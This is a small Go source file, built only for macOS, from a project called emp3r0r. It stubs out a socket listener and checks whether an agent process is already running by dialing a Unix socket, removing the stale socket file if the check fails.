//go:build darwin
// +build darwin

package main

import (
	"net"
	"os"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
)

// Dummy implementation for darwin build

func socketListen() {
	logging.Println("socketListen dummy for darwin")
}

func isAgentAliveSocket() bool {
	logging.Printf("Checking if agent is alive via socket %s", common.RuntimeConfig.SocketName)
	conn, err := net.Dial("unix", common.RuntimeConfig.SocketName)
	if err != nil {
		logging.Printf("Agent seems dead: %v, removing socket to bind", err)
		err := os.Remove(common.RuntimeConfig.SocketName)
		if err != nil {
			logging.Printf("Failed to remove socket: %v", err)
		}
		return false
	}
	defer conn.Close()
	return agentutils.CheckAgentAlive(conn)
}
